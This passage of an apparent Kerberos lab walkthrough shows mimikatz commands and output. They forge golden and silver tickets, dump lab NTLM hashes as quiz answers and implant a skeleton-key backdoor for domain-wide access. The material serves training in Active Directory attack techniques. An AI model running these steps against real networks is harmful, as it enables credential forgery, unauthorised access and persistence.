1. `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` – This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

I’ll show you a demo of creating a golden ticket it is up to you to create a silver ticket.

```
mimikatz # kerberos::golden /user:Administrator /domain:CONTROLLER.LOCAL /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3
f6 /id:500
User      : Administrator 
Domain    : CONTROLLER.LOCAL (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 6/30/2021 7:54:08 AM ; 6/28/2031 7:54:08 AM ; 6/28/2031 7:54:08 AM
-> Ticket : ticket.kirbi

 * PAC generated 
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

**Tips:** to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

### Use the Golden/Silver Ticket to access other machines 

1.) `misc::cmd` – this will open a new elevated command prompt with the given ticket in mimikatz.

![](2025-05-31-attacking-kerberos-5.png)

2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

![](2025-05-31-attacking-kerberos-6.png)

This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.

### **Questions**

* What is the SQLService NTLM Hash? Answer: `cd40c9ed96265531b21fc5b1dafcfb0a`

```bash
mimikatz # lsadump::lsa /inject /name:SQLService  
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 00000455 (1109)  
User : SQLService

* Primary  
NTLM : cd40c9ed96265531b21fc5b1dafcfb0a  
---snip---
```

* What is the Administrator NTLM Hash? Answer: `2777b7fec870e04dda00cd7260f7bee6`

```bash
mimikatz # lsadump::lsa /inject /name:Administrator  
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f4 (500)  
User : Administrator

* Primary  
NTLM : 2777b7fec870e04dda00cd7260f7bee6  
---snip---
```

## Kerberos Backdoors w/ mimikatz

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password mimikatz

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

### Skeleton Key Overview 

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

> **Warning**: A skeleton key only works using Kerberos RC4 encryption.

> **Note**: The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password _“mimikatz”_

### Preparing Mimikatz 

1. `cd Downloads && mimikatz.exe` – Navigate to the directory mimikatz is in and run mimikatz
2. `privilege::debug` – This should be a standard for running mimikatz as mimikatz needs local administrator access

### Installing the Skeleton Key w/ mimikatz 

1. `misc::skeleton` – Yes! that’s it but don’t underestimate this small command it is very powerful

### Accessing the forest 

The default credentials will be: `mimikatz`

* example: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` – The share will now be accessible without the need for the Administrators password
* example: `dir \\Desktop-1\c$ /user:Machine1 mimikatz` – access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.

## Conclusion 

We’ve gone through everything from the initial enumeration of Kerberos, dumping tickets, pass the ticket attacks, kerberoasting, AS-REP roasting, implanting skeleton keys, and golden/silver tickets. I encourage you to go out and do some more research on these different types of attacks and really find what makes them tick and find the multitude of different tools and frameworks out there designed for attacking Kerberos as well as active directory as a whole.

You should now have the basic knowledge to go into an engagement and be able to use Kerberos as an attack vector for both exploitations as well as privilege escalation.

Know that you have the knowledge needed to attack Kerberos I encourage you to configure your own active directory lab on your network and try out these attacks on your own to really get an understanding of how these attacks work.

### Resources: 

* [https://beta.hackndo.com/kerberos/](https://beta.hackndo.com/kerberos/)
* [https://www.youtube.com/watch?v=lJQn06QLwEw](https://www.youtube.com/watch?v=lJQn06QLwEw)
* [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
* [https://www.harmj0y.net/blog/](https://www.harmj0y.net/blog/)
* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
* [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
* [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
* [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don’t-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%E2%80%99t-Get-It-wp.pdf)
* [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
* [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
* [https://www.youtube.com/watch?v=Nl\_8WHcB5SM](https://www.youtube.com/watch?v=Nl_8WHcB5SM)
* [https://www.youtube.com/watch?v=lfosOfFfD\_g\&pp=ygUcYXR0YWNraW5nIGtlcmJlcm9zIHRyeWhhY2ttZQ%3D%3D](https://www.youtube.com/watch?v=lfosOfFfD_g\&pp=ygUcYXR0YWNraW5nIGtlcmJlcm9zIHRyeWhhY2ttZQ%3D%3D)
